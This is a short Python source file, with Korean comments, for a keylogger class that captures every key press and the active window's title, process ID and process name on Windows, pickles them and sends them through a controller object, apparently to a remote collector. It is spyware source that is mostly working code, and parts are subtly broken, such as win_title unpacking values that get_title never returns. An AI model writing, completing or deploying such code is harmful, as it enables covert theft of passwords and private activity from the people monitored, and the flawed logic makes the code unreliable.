import time
from pynput.keyboard import Listener
import ctypes
import psutil
import pickle


class Keylogger:

    def __init__(self, controller):
        self.controller = controller

    def on_press(self, key):
        data = pickle.dumps({'info': 1, 'key': key})
        self.controller.send(data)

    def get_title(self):
        """ 현재 활성화된 윈도우의 정보를 가져옴"""
        user32 = ctypes.windll.LoadLibrary('user32.dll')
        handle = user32.GetForegroundWindow()  # 현재 활성화 윈도우 핸들
        buffer = ctypes.create_unicode_buffer(255)  # 저장버퍼 할당
        user32.GetWindowTextW(handle, buffer, ctypes.sizeof(buffer))  # 버퍼에 타이들 저장
        pid = ctypes.c_ulong()
        user32.GetWindowThreadProcessId(handle, ctypes.byref(pid))  # pid를 얻음
        pid = pid.value
        if pid == 0: return
        p = psutil.Process(pid)
        data = pickle.dumps({'info': 2, 'pid': pid, 'pname': p.name(), 'title': buffer.value})
        self.controller.send(data)

    def win_title(self):
        """ 타이틀 변경 관리 """
        pid, pname, title = 0, "", ""
        while True:
            time.sleep(0.1)
            new_pid, new_pname, new_title = self.get_title()
            if pid != new_pid:  # 프로세스가 바뀐경우
                print("pid change %s", new_pname)
            else:
                if title != new_title:  # 타이틀이 바뀐경우
                    print("title change %d [%s]" % (new_pid, new_title))

                pid, pname, title = new_pid, new_pname, new_title

    def listen(self):
        with Listener(on_press=self.on_press) as listener:
            listener.join()
